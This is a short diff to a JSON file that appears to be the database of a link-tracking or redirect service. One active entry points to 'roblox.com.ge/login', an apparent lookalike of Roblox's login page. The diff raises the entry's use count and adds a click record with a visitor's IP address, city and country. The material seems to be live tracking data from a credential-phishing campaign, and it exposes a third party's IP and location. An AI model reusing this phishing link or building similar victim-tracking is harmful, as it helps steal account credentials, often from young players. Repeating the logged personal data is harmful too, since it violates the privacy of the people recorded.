@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1451,
+    "useCount": 1452,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11776,6 +11776,14 @@
         "city": "Manassas",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777434822857,
+        "ip": "112.198.207.173",
+        "country": "Philippines",
+        "city": "Nasugbu",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
